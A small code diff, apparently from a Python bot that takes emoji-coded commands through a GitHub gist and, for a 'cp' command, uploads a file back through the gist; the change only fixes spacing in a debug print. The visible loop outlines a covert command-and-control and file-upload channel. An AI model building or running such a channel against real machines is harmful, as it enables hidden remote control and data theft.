@@ -92,7 +92,7 @@ while True:
 
         elif cmd_emoji == emojis.command['cp']:
             params = gist.get_data_from_url(GIST_API, FILENAME)
-            print("RECEIVED cp" + params, file=sys.stderr, flush=True)
+            print("RECEIVED cp " + params, file=sys.stderr, flush=True)
             gist.send_file_respose_url(GIST_API, FILENAME, params)
             print("EXECUTED cp", file=sys.stderr, flush=True)
 
